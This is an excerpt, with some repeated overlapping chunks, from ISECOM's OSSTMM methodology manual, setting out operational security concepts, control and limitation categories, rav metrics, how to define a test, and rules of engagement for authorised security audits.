Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 12\\nPurpose The primary purpose of this manual is to provide a scientific methodology for the accurate characterization of operational security (OpSec) through examination and correlation of test results in a consistent and reliable way. This manual is adaptable to almost any audit type, including penetration tests, ethical hacking, security assessments, vulnerability assessments, red-teaming, blue-teaming, and so forth. It is written as a security research document and is designed for factual security verification and presentation of metrics on a professional level. A secondary purpose is to provide guidelines which, when followed correctly, will allow the analyst to perform a certified OSSTMM audit. These guidelines exist to assure the following: 1. The test was conducted thoroughly. 2. The test included all necessary channels. 3. The posture for the test complied with the law. 4. The results are measurable in a quantifiable way. 5. The results are consistent and repeatable. 6. The results contain only facts as derived from the tests themselves. An indirect benefit of this manual is that it can act as a central reference in all security tests regardless of the size of the organization, technology, or protection. Document Scope The scope of this document is to provide specific descriptions for operational security tests over all operational channels, which include Human, Physical, Wireless, Telecommunications, and Data Networks, over any vector, and the description of derived metrics. This manual only focuses on OpSec and the use of the words safety and security are within this context. Liability This manual describes certain tests which are designed to elicit a response. Should these tests cause harm or damage, the Analyst may be liable according to the laws governing the Analyst’s location as well as the location of the tested systems. ISECOM makes no guarantee as to a harmless outcome of any test. Any Analyst applying this methodology cannot hold ISECOM liable for problems which arise during testing. In using this methodology, the Analyst agrees to assume this liability.

The STAR must also meet the reporting requirements in this manual. The STAR can be submitted to ISECOM for review and official ISECOM certification. A certified test and an accredited report does not need to show that this entire manual or any specific subsections were followed. It needs only show what was and was not tested to be applicable for certification. (See Chapter 16, Making the STAR for details and an example of a STAR.) A certified OSSTMM audit provides the following benefits:  Serves as proof of a factual test  Holds Analyst responsible for the test  Provides a clear result to the client  Provides a more",

This is how the OSSTMM itself had been approached as a means of understanding the best, most efficient, and most thorough way to test security. Therefore, we needed to understand security. This research seeking the “security particle” as it turns out has brought about the application and design of more projects beyond the OSSTMM. While not all applications of the OSSTMM to areas outside of security testing are worthy of being projects. However, some do provide a testament to the fact that we are now only limited by our own imaginations. The OSSTMM has become a tool with which we can take new approaches to many new means of protection. Source Code Analysis Risk Evaluation (SCARE) The SCARE project applies the OSSTMM ravs to source code analysis. The end result is a SCARE value which is the amount of the source code with unprotected operations. http://www.isecom.org/scare Home Security Methodology and Vacation Guide (HSM) The HSM project applies the OSSTMM ravs, Four Point Process, Trust Metrics, and analysis process to protecting and fortifying a home. The end result is to create a home that is safer and more secure without restricting the freedoms of the occupants. http://www.isecom.org/hsm Hacker Highschool (HHS) HHS is a different kind of security awareness program for teens. It uses the OSSTMM testing and analysis research to provide knowledge and skills through hands-on lessons and access to an Internet-based test network. However while doing so, it reinforces resourcefulness and critical thinking skills. http://www.hackerhighschool.org The Bad People Project (BPP) The BPP is a different kind of security and safety awareness program for children and parents. It uses OSSTMM ravs and Trust Metrics to create better rules for children about safety and security to be explained through games, stories, and role play. The rules are easier to remember and free of contradictions and cultural biases. The parents can visit and contribute to the gallery of children’s drawings which examines what children think what a bad person looks like. These drawings are the further used to find new ways to reach children and improve the rules taught to them. http://www.badpeopleproject.org Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 17\\nSecurity Operations Maturity Architecture (SOMA) The SOMA project aims to provide the OSSTMM operational processes at the strategic level.

This adds new strategic insight to the security of business conduct by employees and in the development of new business plans. http://www.isecom.org/bit Smarter Safer Better This project provides the safety and security tools and skills people need every day to combat fraud, lies, and deception. The tools are based on the OSSTMM research which is focused on avoiding persuasive tricks and manipulation techniques. The project is unique in how it utilizes support groups for people to discuss issues they have encountered and work together to analyze the problems. http://www.smartersaferbetter.org Mastering Trust This project is to create seminar materials and workbooks on how to use the OSSTMM Trust Metrics in every day life to make better decisions. This project addresses why our gut instincts are broken and how we can fix and improve them.

It is about measuring how well security works. While this may seem plain and obvious: “Don’t we all do operational security?” it is a distinction which must be made because most compliance objectives require no more than matching processes and configurations to a set of best practices. This manual and the testing process it outlines requires that you make no assumptions that a security solution, product, or process will behave during operational use as it has been designated to do on paper. More simply, this methodology will tell you if what you have does what you want it to do and not just what it was told to do. OpSec is a combination of separation and controls. Under OpSec, for a threat to be effective, it must interact either directly or indirectly with the asset. To separate the threat from the asset is to avoid a possible interaction. Therefore it is possible to have total (100%) security if the threat and the asset are completely separated from each other. Otherwise what you have is safety of the asset which is provided by the controls you put on the asset or the degree to which you lessen the impact",

Otherwise what you have is safety of the asset which is provided by the controls you put on the asset or the degree to which you lessen the impact of the threat. For example, to be secure from lightning, one must move to where lightning can’t reach such as deep in a mountain. Threats which can’t be separated from the assets must be made safer so that their interactions and any effects from interactions do little or no harm. In this same example, to be safe from lightning, one must stay indoors during storms, avoid windows or other openings, and use lightning rods on the roof. Therefore, under the context of operational security, we call security the separation of an asset and a threat and safety the control of a threat or its effects. To have true safety of the assets different types of controls are required. However, controls also may increase the number of interactions within the scope which means more controls are not necessarily better. Therefore it is recommended to use different types of operational controls rather than just more controls. More controls of the same type of operational controls do not provide a defense in depth as access through one is often access through all of that type. This is why it is so important to be able to categorize controls by what they do in operations to be certain of the level of protection provided by them. To better understand how OpSec can work within an operational environment, it must be reduced to its elements. These elements allow one to quantify the Attack Surface, which is the lack of specific separations and functional controls that exist for that Vector, the direction of the interaction. The reductionist approach resolves to us needing to see security and safety in a new way, one that allows for them to exist independent of risk and fully capable of creating Perfect Security, the exact balance of security and controls with operations and limitations. However, to see security in a new way requires new terminology as well.

For example, insuring the store in the case of fire is a control that does not prevent the inventory from getting damaged or stolen but will pay out Controls equivalent value for the loss. Ten controls have been defined. The first five controls are Class A and control interactions. The five Class B controls are relevant to controlling procedures. See section 1.2 below for further information regarding controls. This is the current state of perceived and known limits for channels, operations, and controls as verified within the audit. Limitation types are classified by how they interact with security and safety on an operational level. Therefore, opinions as to impact, availability in the wild, difficulty to perform, and complexity are not used to classify them. For example, an old rusted lock used to secure the gates of the store at closing time has an imposed security limitation providing a fraction of the protection strength Limitations necessary to delay or withstand an attack. Determining that the lock is old and weak through visual verification is referred to as an identified limitation. Determining it is old and weak by breaking it using 100 kg of force when a successful deterrent requires 1000 kg of force shows a verified limitation. One of its limitations is then classified based on the consequence of the operational action, which in this case is Access. Operations are the lack of security one must have to be interactive, useful, public, open, or available. For example, limiting how a person buys goods Operations or services from a store over a particular channel, such as one door for going in and out, is a method of security within the store’s operations.

In this scale, 100 rav (also sometimes shown as 100% rav) is perfect balance and Rav anything less is too few controls and therefore a greater attack surface. More than 100 rav shows more controls than are necessary which itself may be a problem as controls often add interactions within a scope as well as complexity and maintenance issues.

Either the separation between an asset and any threats exists or it does not. There are 3 logical and proactive ways to create this separation: 1. Move the asset to create a physical or logical barrier between it and the threats. 2. Change the threat to a harmless state. 3. Destroy the threat. When analyzing the state of security we can see where there is the possibility for interaction and where there is not. We know some, all, or even none of these interactions may be required for operations. Like doors into a building, some of the doors are needed for customers and others for workers. However, each door is an interactive point which can increase both necessary operations and unwanted ones, like theft. Since the security tester may not know at this point the business justification for all these interactive points, we refer to this as the porosity. The porosity reduces the separation between a threat and an access. It is further categorized as one of 3 elements, visibility, access, or trust which describes its function in operations which further allows the proper controls to be added during the remediation phase of improving protection. So consider that if the separation exists properly from the threats, such as a man inside a mountain avoiding lightning, then that security is true; it is 100%. For every hole in the mountain, every means for lightning to cause harm to that man, the porosity increases as an Access. Each point of interaction reduces the security below 100%, where 100% represents a full separation. Therefore, the increase in porosity is the decrease in security and each pore is either a Visibility, Access, or Trust.

Term Definition Police science places “opportunity” as one of the three elements which encourage theft, along with “benefit”, and “diminished risk”. Visibility is a means of calculating opportunity. It is each target’s asset known to exist Visibility within the scope. Unknown assets are only in danger of being discovered as opposed to being in danger of being targeted. Since security is the separation of a threat and an asset then the ability to interact with the asset directly is to access it. Access is calculated by the number of different places where the interaction can occur. Removing Access direct interaction with an asset will halve the number of ways it can be taken away. We measure trust as part of OpSec as each relationship that exists where the target accepts interaction freely from another target within the scope. While a trust may be a security hole, it is a common replacement for authentication and a means for evaluating relationships in a rational and Trust repeatable manner. Therefore, the use of trust metrics is encouraged which will allow for one to measure how valid a trust is by calculating the amount of reliability in the trust.

Controls are a means to influence the impact of threats and their effects when interaction is required. Just because you can’t directly control it doesn’t mean it can’t be controlled. Control the environment and you control everything in it. While there are many different names and types of operation controls, there are only 12 main categories which contain all possible controls. Two of the categories however, Identification, the verification of an existing identity, and Authorization, the granting of permissions from the rightful authority, cannot stand alone in an operational environment and instead, in operations, combine and are added to the Authentication control. This leaves OpSec with ten possible controls an Analyst will need to identify and understand. The reason why Identification and Authorization cannot be expressed operationally is because neither can be transferred. Identity exists as is and while the means of identification, as a process, is an operational aspect, the actual process is to verify a previously provided identity from another source or from the latest in a chain of sources. Even under circumstances where a government agency officially changes the identity of a person, they are still the same person from identifying marks to their DNA and only their documentation changes. Therefore, a security process can attempt to identify someone by verifying their identity but nothing in this case is granted or provided. There is no true “granting” of identity just as there can be no true “theft” of identity.",

Therefore, a security process can attempt to identify someone by verifying their identity but nothing in this case is granted or provided. There is no true “granting” of identity just as there can be no true “theft” of identity. Furthermore, identity is a collection of thoughts, emotions, experiences, relationships, and intentions, as well as physical shape or marks. You are who you are because you exist not because someone granted that to you. A perfect duplicate or clone of you is still not you because from origin your experiences will differ. While this may sound more like philosophy than security, it is very important that Analysts understand this. Identification processes only verify against a former identification process. If that process has been corrupted or can be circumvented, then the entire security foundation that requires proper identification is flawed. Authorization, like Identification, is another operations control which cannot be transferred. It is the control to grant permissions. An employee authorized to enter a room may hold the door open for another person to enter. This does not authorize the new person. Authorization did not get transferred. This new person is trespassing in a restricted area and the employee who held open the door actually was part of a limitation in the Authentication process to grant Access. Another property of Authorization is that it requires identification to work. Without identification, authorization is a blanket “permit all” without even knowing what all is. However in operations this is itself a paradox because to authorize all without scrutiny means that there is no authorization. Therefore to not authorize you do not use authorization. The Authentication control combines both identification and authorization to map Access. The process is simply knowing who (or what) it is and what, where, when, and how they can access before they are granted access. Because authentication is a control for interactivity, it is one of the five Class A controls, also known as the “Interactive Controls”. Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 24\\nInteractive Controls The Class A Interactive Controls make up exactly half of all the operation controls. These controls directly influence visibility, access, or trust interactions. The Class A categories are Authentication, Indemnification, Subjugation, Continuity, and Resilience. 1. Authentication is a control through the challenge of credentials based on identification and authorization. 2. Indemnification is a control through a contract between the asset owner and the interacting party. This contract may be in the form of a visible warning as a precursor to legal action if posted rules are not followed, specific, public legislative protection, or with a third-party assurance provider in case of damages like an insurance company. 3. Resilience is a control over all interactions to maintain the protection of assets in the event of corruption or failure. 4. Subjugation is a control assuring that interactions occur only according to defined processes. The asset owner defines how the interaction occurs which removes the freedom",

The asset owner defines how the interaction occurs which removes the freedom of choice but also the liability of loss from the interacting party. 5. Continuity is a control over all interactions to maintain interactivity with assets in the event of corruption or failure. Process Controls The other half of operation controls are the Class B controls which are used to create defensive processes. These controls do not directly influence interactions rather they protect the assets once the threat is present. These are also known as Process Controls and include Non-repudiation, Confidentiality, Privacy, Integrity, and Alarm. 6. Non-repudiation is a control which prevents the interacting party from denying its role in any interactivity. 7. Confidentiality is a control for assuring an asset displayed or exchanged between interacting parties cannot be known outside of those parties. 8. Privacy is a control for assuring the means of how an asset is accessed, displayed, or exchanged between parties cannot be known outside of those parties. 9. Integrity is a control to assure that interacting parties know when assets and processes have changed. 10. Alarm is a control to notify that an interaction is occurring or has occurred. While controls are a positive influence in OpSec, minimizing the attack surface, they can themselves add to the attack surface if they themselves have limitations. Often times this effect is not noticed and if the protection mechanisms aren’t tested thoroughly as to how they work under all conditions, this may not become apparent. Therefore the use of controls must assure that they do not insinuate new attack vectors into the target. Therefore, sometimes no controls are better than bad controls.

An Analyst must use critical security thinking, a form of logic skills to overcome the innate sense of security we carry to understand why bad controls can increase the attack surface to greater than no control at all. Common thought is that adding controls with limitations are better than having none at all. Is it not better to have a poor lock than to have no lock at all? After all, as conventional wisdom suggests, a wisdom borne of emotion rather than verification, some “security” is better than none. This is why the analogy of the lock is such a good example and actually does better to answer the question then any other because it shows so well how we misunderstand controls that are so common around us. Ask anyone who has had to break open a locked door where they kick or hit the door to open it? That answer differs whether it is a key lock opened from the outside as",

    "text": "because it shows so well how we misunderstand controls that are so common around us. Ask anyone who has had to break open a locked door where they kick or hit the door to open it? That answer differs whether it is a key lock opened from the outside as opposed to a bolt lock on the inside. There’s a reason for this. When a lock (which is considered the authentication control) is added to a door, the heavy, solid door needs to have a space hollowed out and the lock inserted. That creates a limitation, a weak spot in the door. So does adding a handle. Doors with no handles or internal locks do not have this limitation. However they require the door to be opened from the inside in another means. So to open a door with that kind of lock, you kick or hit the door at the handle or lock mechanism. If there is a bolt lock, that limitation does not exist because the door remains solid. Those doors often require a force to open that will sooner break the door than the lock. Doors made to withstand high pressures have the bolts on the outside and the opening mechanism in the center of the door as a small hole, like doors on a boat or submarine, to avoid the weaknesses of hollowing out part of the door. Now to more directly answer the question: if it is better to have a weak lock than no lock. This question refers to a door with the minimum, a cheap or simple key lock (authentication) that can be bypassed by someone who wants to enter. So if we know the authentication is weak, then we know somebody can get in and even worse, they can do it without damaging the lock or the door which means we may have no knowledge of the intrusion. If you think, well, that’s okay because our problem isn’t the real crooks, it’s the opportunists looking for the low- hanging fruit then you’re making a risk decision and that does not affect your attack surface which is made from what you have and not what you want. Furthermore, by having a lock at all implies, most of all to the opportunists, that there is something of value inside. If you add a control, any control, you increase the attack surface of anything. If that new thing you add brings a new attack vector then you were probably better off without. In some cases, the new attack vector is smaller than the actual amount of safety the new control gives you. However, a good control will have no limitations and can shrink the attack surface. A lock in a door should not be easily subverted or add to the attack surface in a significant way. Such a lock requires force to open and that adds another control then which the lock provides, alarm. A broken lock is also a good notification of a break-in.",

These objectives are used across the information security industry although due in part to their over-simplification, they are more for the benefit of managing it rather than creating it or testing it. The mapping is not a perfect 1:1 however it is sufficient to demonstrate operation controls according to the basic CIA Triad. Because the definitions used for CIA are very broad the mappings appear to be as such: Information Assurance Objectives Operation Controls Confidentiality Privacy Confidentiality Authentication Resilience Integrity Non-repudiation Integrity Subjugation Continuity Indemnification Availability Alarm Creative Commons 3.0 Attribution-Non-Commercial-NoDerivs 2010, ISECOM, www.isecom.org, www.osstmm.org 27\\n1.4 Limitations The inability of protection mechanisms to work are their limitations. Therefore the state of security in regard to known flaws and restrictions within the operations scope is called Limitation. It is the holes, vulnerabilities, weaknesses, and problems in keeping that separation between an asset and a threat or in assuring controls continue working correctly. Limitations have been classified into five categories and these categories define the type of vulnerability, mistake, misconfiguration, or deficiency by operation. This is different from how limitations are classified under most security management frameworks and best practices which is why we use the term Limitation rather than more common terms to avoid confusion. Those other terms refer to vulnerabilities or deficiencies because they are categorized by the type of attack or often the threat itself. There is a focus on the risk from the attack. However, to remove bias from security metrics and provide a more fair assessment we removed the use of risk. Risk itself is heavily biased and often highly variable depending on the environment, assets, threats, and many more factors. Therefore, under OpSec, we use the term Limitations to express the difference of categorizing how OpSec fails rather than by the type of threat. Since the number and type of threats cannot be known it makes more sense to understand a security or safety mechanism based on when it will fail. This allows the Analyst to test for the conditions in which it will no longer sustain the necessary level of protection. Only once we have this knowledge can we begin to play the what-if game of threats and risks. Then we can also invest in the appropriate type of separation or controls required and create precise plans for disasters and contingencies. Although the Limitations are categorized here as 1 through 5 this does not mean they are in a hierarchical format of severity. Rather they are numbered only to differentiate them",

Although the Limitations are categorized here as 1 through 5 this does not mean they are in a hierarchical format of severity. Rather they are numbered only to differentiate them both for operational planning and metrics. This also means it is possible that more than one type of Limitation can be applied to a single problem. Furthermore, the weight (value) of a particular Limitation is based on the other available and corresponding controls and interactive areas to the scope, there can be no specific hierarchy since the value of each is specific to the protective measures in the scope being audited. Within the OSSTMM the five Limitation classifications are: 1. Vulnerability is the flaw or error that: (a) denies access to assets for authorized people or processes, (b) allows for privileged access to assets to unauthorized people or processes, or (c) allows unauthorized people or processes to hide assets or themselves within the scope. 2. Weakness is the flaw or error that disrupts, reduces, abuses, or nullifies specifically the effects of the five interactivity controls: authentication, indemnification, resilience, subjugation, and continuity. 3. Concern is the flaw or error that disrupts, reduces, abuses, or nullifies the effects of the flow or execution of the five process controls: non-repudiation, confidentiality, privacy, integrity, and alarm. 4. Exposure is an unjustifiable action, flaw, or error that provides direct or indirect visibility of targets or assets within the chosen scope channel. 5. Anomaly is any unidentifiable or unknown element which has not been controlled and cannot be accounted for in normal operations.

A vulnerability is the flaw or error that: (a) denies access to assets for authorized people or processes (b) allows for privileged access to assets to unauthorized people or processes, or (c) allows unauthorized people or processes to hide assets or themselves within the scope. This means that Vulnerability must be mapped to all points of interaction or OpSec and because Vulnerability can circumnavigate or nullify the Controls, these must also be considered in the weighting of Vulnerability. A weakness is a flaw in Class A Controls however can impact OpSec therefore it is mapped to all OpSec parameters as well as being mapped to this interactive class of controls. A concern can only be found in Class B Controls however can impact OpSec therefore it is mapped to all OpSec parameters as well as being mapped to this process class of controls.

An exposure gives us intelligence about the interaction with a target and thus maps directly to Visibility and Access. This intelligence can also help an attacker navigate around some or all controls and so Exposure is also mapped to both Control classes. Finally, Exposure has no value itself unless there is a way to use this intelligence to exploit the asset or a Control and so Vulnerabilities, Weaknesses and Concerns also play a role in the weighting of Exposure’s value. An anomaly is any unidentifiable or unknown element which has not been controlled and cannot be accounted for in normal operations. The fact that it has not been controlled and cannot be accounted for signifies a direct link with Trust. This Limitation can also cause anomalies in the way Controls function and so they are also included in the weighting. Finally, as with an Exposure, an Anomaly alone does not affect OpSec without the existence of either a Vulnerability, Weakness or Concern which can exploit this unusual behavior.

For example, an Authentication control which allows a person to hijack another person’s credentials has a Weakness and should the credentials allow Access then it also has a Vulnerability. In another example, an Authentication control uses a common list of names corresponding to e-mail addresses. Every address which can be found or guessed and used as a log-in is an Exposure while the control itself has a Weakness for its inability to identify the correct user of the Authentication mechanism of the log-in. If any of those credentials allow Access then we include this as a Vulnerability as well. Justification for Limitations The concept that limitations are only limitations if they have no business justification is false. A limitation is a limitation if it behaves in one of the limiting factors as described here. A justification for a limitation is a risk decision that is met with either a control of some kind or merely acceptance of the limitation. Risk decisions that accept the limitations as they are often come down to: the damage a limitation can cause does not justify the cost to fix or control the limitation, the limitation must remain according to legislation, contracts, or policy, or a conclusion that the threat does not exist or is unlikely for this particular limitation. Since risk justifications are not a part of calculating an attack surface, all limitations discovered must still be counted within the attack surface regardless if best practice, common practice, or legal practice denotes it as not a risk.

If it is not then the audit will not show a true representation of the operational security of the scope. Managing Limitations Another concept that must be taken into consideration is one of managing flaws and errors in an audit. The three most straightforward ways to manage limitations is to remove the problem area providing the interactive point altogether, fix them, or accept them as part of doing business known as the business justification. An audit will often uncover more than one problem per target. The Analyst is to report the limitations per target and not just which are the weak targets. These limitations may be in the protection measures and controls themselves, thus diminishing OpSec. Each limitation is to be rated as to what occurs when the problem is invoked, even if that invocation is theoretical or the verification is of limited execution to restrict actual damages. Theoretical categorization, where no verification could be made, is a slippery slope and should be limited to cases where verification would reduce the quality of operations. Then, when categorizing the problems, each limitation should be examined and calculated in specific terms of operation at its most basic components. However, the Analyst should be sure never to report a “flaw within a flaw” where the flaws share the same component and same operational effect. An example of this would be a door broken open with a broken window. The door opening is an Access even if the broken window is also but both are for the same component, the door way, and same operational effect, an opening. An example from Data Networks would be a computer system which sends a kernel reply, such as an ICMP “closed port” T03C03 packet for a particular port. This interaction is not counted for all such ports since the Access comes from the same component, the kernel, and has the same operational effect, sending a T03C03 packet per port queried.

It’s like having ten ways of controlling threats that come through a hole in a wall. For each hole, a maximum of ten different controls can be applied which bring security back up towards and sometimes above 100%. Limitations then reduce the effectiveness of OpSec and Controls. The result of an audit which discovers and shows the Security, Controls, and Limitations is effectively demonstrating Actual Security. Actual Security is a term for a snapshot of an attack surface in an operational environment. It is a logarithmic representation of the Controls, Limitations, and OpSec at a particular moment in time. It is logarithmic because it represents the reality of size where a",

It is a logarithmic representation of the Controls, Limitations, and OpSec at a particular moment in time. It is logarithmic because it represents the reality of size where a larger scope will have a larger attack surface even if mathematically the Controls will balance the OpSec. Using this as building blocks to better understand how security works, the visualization that we create from this is the effective balance created between where an attack can occur, where the Controls are in place to manage an attack, and the limitations of the protective measures. Another benefit of mathematical representation of an attack surface as Actual Security is that besides just showing where protection measures are lacking it can also show the opposite. Since it is possible to have more controls than one needs this can be mathematically represented as more than 100% rav. Whether a risk assessment may make this point seem impossible, the mathematical representation is useful for showing waste. It can be used to prove when money is being overspent on the wrong types of controls or redundant controls. 1.6 Compliance Compliance is a different thing than security and exists separate from security. It is possible to be compliant yet not secure and it is possible to be relatively secure but non-compliant and therefore of low trustworthiness. Compliance projects are not the time to redefine operational security requirements as a result of an OSSTMM test, they may however be the time to specify the use of OSSTMM testing, on a periodic basis, to fulfill a control requirement drafted as a result of a trust assessment that has scoped the minimum number of controls required to achieve a compliant (but not necessarily secure) state. The big problem with compliance is it requires a lot of documentation that has to be versioned and updated. This documentation can be of business processes, narratives, trust assessments, risk assessments, signed off design tests, operational audits, attestations, and so on and on. This documentation is scrutinized by internal and external auditors and has to logically fulfill its existence in the world of a compliant state. Most recent compliance efforts have been driven by the short term requirements of imposed regulations with short term implementation requirements. This has created a lot of resource requirements and cost. Given time to think about it we try to build compliance and evidence production into a process and manage this resource requirement and cost. Compliance is a broad brush approach to the application of best practice from, as far as Information Technology is concerned, the likes of COBIT and ITIL; an OSSTMM test should provide documentation that provides an understandable, verifiable level of quality. The use of the OSSTMM, however, is designed to allow the Analyst to view and understand security and safety.

Testing is a complicated affair and with anything complicated, you approach it in small, comprehensible pieces to be sure you don’t make mistakes. Conventional wisdom says complexity is an enemy of security. However, it is only at odds with human nature. Anything which is made more complex is not inherently insecure. Consider a computer managing complex tasks. The problem as we know it is not that the computer will make mistakes, confuse the tasks, or forget to complete some. As more tasks are added to the computer, it gets slower and slower, taking more time to complete all the tasks. People, however, do make mistakes, forget tasks, and purposely abandon tasks which are either not important or required at the moment. So when testing security, what you need to do is properly manage any complexity. This is done by properly defining the security test. 2.1 Defining a Security Test These 7 steps will take you to the start of a properly defined security test. 1. Define what you want to protect. These are the assets. The protection mechanisms for these assets are the Controls you will test to identify Limitations. 2. Identify the area around the assets which includes the protection mechanisms and the processes or services built around the assets. This is where interaction with assets will take place. This is your engagement zone. 3. Define everything outside the engagement zone that you need to keep your assets operational. This may include things you may not be able to directly influence like electricity, food, water, air, stable ground, information, legislation, regulations and things you may be able to work with like dryness, warmth, coolness, clarity, contractors, colleagues, branding, partnerships, and so on. Also count that which keeps the infrastructure operational like processes, protocols, and continued resources. This is your test scope. 4. Define how your scope interacts within itself and with the outside. Logically compartmentalize the assets within the scope through the direction of interactions such as inside to outside, outside to inside, inside to inside, department A to department B, etc. These are your vectors. Each vector should ideally be a separate test to keep each compartmentalized test duration short before too much change can occur within the environment. 5. Identify what equipment will be needed for each test. Inside each vector, interactions may occur on various levels. These levels may be classified in",

Identify what equipment will be needed for each test. Inside each vector, interactions may occur on various levels. These levels may be classified in many ways, however here they have been classified by function as five channels. The channels are Human, Physical, Wireless, Telecommunications, and Data Networks. Each channel must be separately tested for each vector. 6. Determine what information you want to learn from the test. Will you be testing interactions with the assets or also the response from active security measures? The test type must be individually defined for each test, however there are six common types identified here as Blind, Double Blind, Gray Box, Double Gray Box, Tandem, and Reversal. 7. Assure the security test you have defined is in compliance to the Rules of Engagement, a guideline to assure the process for a proper security test without creating misunderstandings, misconceptions, or false expectations. The end result will be a measurement of your Attack Surface. The attack surface is the unprotected part of the Scope from a defined Vector.

The scope is comprised of three classes of which there are five channels: Telecommunications and Data Networks security Channels of the COMSEC class, Physical and Human Security Channels of the PHYSSEC class, and the full spectrum Wireless Security Channel of the SPECSEC class. Classes are from official designations currently in use in the security industry, government, and the military. Classes are used to define an area of study, investigation, or operation. However, Channels are the specific means of interacting with assets. An asset can be anything that has value to the owner. Assets can be physical property like gold, people, blueprints, laptops, the typical 900 MHz frequency phone signal, and money; or intellectual property such as personnel data, a relationship, a brand, business processes, passwords, and something which is said over the 900 MHz phone signal. Often, the scope extends far beyond the reach of the asset owner as dependencies are beyond the asset owner’s ability to provide independently. The scope requires that all threats be considered possible, even if not probable. Although, it must be made clear that a security analysis must be restricted to that which is within a type of certainty (not to be confused with risk which is not a certainty but a probability). These restrictions include: 1. Non-events such as a volcano eruption where no volcano exists, 2. Non-impact like moonlight through data center window, or 3. Global-impacting such as a catastrophic meteor impact. While a thorough security audit requires testing all five channels, realistically, tests are conducted and categorized by the required expertise of the Analyst and the required equipment",

Physical security testing where the channel is both Physical Security physical and non-electronic in nature. Comprises the (PHYSSEC) tangible element of security where interaction Physical requires physical effort or an energy transmitter to manipulate. Comprises all electronic communications, signals, and emanations which take place over the known Spectrum Security EM spectrum. This includes ELSEC as electronic Wireless (SPECSEC) communications, SIGSEC as signals, and EMSEC which are emanations untethered by cables. Comprises all telecommunication networks, digital or analog, where interaction takes place over Telecommunications established telephone or telephone-like network lines. Communications Comprises all electronic systems and data networks Security (COMSEC) where interaction takes place over established cable Data Networks and wired network lines. Data Networks While the channels and their divisions may be represented in any way, within this manual they are organized as recognizable means of communication and interaction. This organization is designed to facilitate the test process while minimizing the inefficient overhead that is often associated with strict methodologies.

Some tests will test the tester’s skill more than actually testing the security of a target. Do note when reporting the audit, there is often a requirement to identify exactly the type of audit performed. Too often, audits based on different test types are compared to track the delta (deviations) from an established baseline of the scope. If the precise test type is not available to a third-party reviewer or regulator, the audit itself should be considered a Blind test, which is one with the least merit towards a thorough security test.

It is required that clients are advised truthfully and factually in regards to their security and security measures. Ignorance is not an excuse for dishonest consultancy. B. Assessment / Estimate Delivery 6. Performing security tests against any scope without explicit written permission from the target owner or appropriate authority is strictly forbidden. 7. The security testing of obviously highly insecure and unstable systems, locations, and processes is forbidden until the proper security infrastructure has been put in place. C.

The scope must be clearly defined contractually before verifying vulnerable services. 18. The audit must clearly explain the limits of any security tests according to the scope. E. Test Plan 19. The test plan may not contain plans, processes, techniques, or procedures which are outside the area of expertise or competence level of the Analyst. F. Test Process 20. The Analyst must respect and maintain the safety, health, welfare, and privacy of the public both within and outside the scope. 21. The Analyst must always operate within the law of the physical location(s) of the targets in addition to rules or laws governing the Analyst’s test location. 22. To prevent temporary raises in security for the duration of the test, only notify key people about the testing. It is the client’s judgment which discerns who the key people are; however, it is assumed that they will be information and policy gatekeepers, managers of security processes, incident response personnel, and security operations staff. 23. If necessary for privileged testing, the client must provide two, separate, access tokens whether they be passwords, certificates, secure ID numbers, badges, etc. and they should be typical to the users of the privileges being tested rather than especially empty or secure accesses. 24. When testing includes known privileges, the Analyst must first test without privileges (such as in a black box environment) prior to testing again with privileges. 25. The Analysts are required to know their tools, where the tools came from, how the tools work, and have them tested in a restricted test area before using the tools on the client organization. 26. The conduct of tests which are explicitly meant to test the denial of a service or process or survivability may only be done with explicit permission and only to the scope where no damage is done outside of the scope or the community in which the scope resides. 27. Tests involving people may only be performed on those identified in the scope and may not include private persons, customers, partners, associates, or other external entities without written permission from those entities. 28. Verified limitations, such as discovered breaches, vulnerabilities with known or high exploitation rates, vulnerabilities which are exploitable for full, unmonitored or untraceable access, or which may immediately endanger lives, discovered during testing must be reported to the customer with a practical solution as soon as they are found. 29.

The Analyst must respect the privacy of all individuals and maintain their privacy for all results. 32. Results involving people untrained in security or non-security personnel may only be reported via non-identifying or statistical means. 33. The Analyst may not sign test results and audit reports in which they were not directly involved. 34. Reports must remain objective and without untruths or any personally directed malice. 35. Client notifications are required whenever the Analyst changes the testing plan, changes the source test venue, has low trust findings, or any testing problems have occurred.

Where solutions and recommendations are included in the report, they must be valid and practical. 37. Reports must clearly mark all unknowns and anomalies. 38. Reports must clearly state both discovered successful and failed security measures and loss controls. 39. Reports must use only quantitative metrics for measuring security. These metrics must be based on facts and void of subjective interpretations. 40. The client must be notified when the report is being sent as to expect its arrival and to confirm receipt of delivery. 41. All communication channels for delivery of the report must be end to end confidential. 42. Results and reports may never be used for commercial gain beyond that of the interaction with the client.

Unfortunately, not everything works as configured. Not everyone behaves as trained. Therefore the truth of configuration and training is in the resulting operations. That’s why we need to test operations. The OpSec testing process is a discrete event test of a dynamic, stochastic system. This means that you will be making a chronological sequence of tests on a system that changes and does not always give the same output for the input provided. The target is a system, a collection of interacting and co-dependent processes which is also influenced by the stochastic environment it exists in. Being stochastic means the behavior of events in a system cannot be determined because the next environmental state can only be partially but not fully determined by the previous state. The system contains a finite but possibly extremely large number of variables and each change in variables may present an event and a change in state. Since the environment is stochastic, there is an element of randomness and there is no means",

    "text": "but not fully determined by the previous state. The system contains a finite but possibly extremely large number of variables and each change in variables may present an event and a change in state. Since the environment is stochastic, there is an element of randomness and there is no means for predetermining with certainty how all the variables will affect the system state. Most of what people understand of OpSec comes from the defensive aspect which is understandable since security is generally considered a defensive strategy. Aggressive testing of OpSec is then relegated to the same class as the exploitation and circumvention of the current design or configuration. However, the fundamental problem with this technique is that a design or configuration does not equate to operation. We encounter many instances in life where operation does not conform to configuration. A simple example is a typical job description. It is more common than not that the policy which dictates one’s job, also known as a job description, falls short from actually reflecting what we do on the job. Another example is the TV channel. Because a channel is set to a particular frequency (configured) it does not mean we will receive the show broadcast on that channel or only that show. This security testing methodology is designed on the principle of verifying the security of operations. While it may not always test processes and policy directly, a successful test of operations will allow for analysis of both direct and indirect data to study the gap between operations and processes. This will show the size of the rift between what management expects of operations from the processes they developed and what is really happening. More simply put, the Analyst’s goal is to answer: “how do current operations work and how do they work differently from how management thinks they work?” A point of note is the extensive research available on change control for processes to limit the amount of indeterminable events in a stochastic system. The Analyst will often attempt to exceed the constraints of change control and present “what if” scenarios which the change control implementers may not have considered. A thorough understanding of change 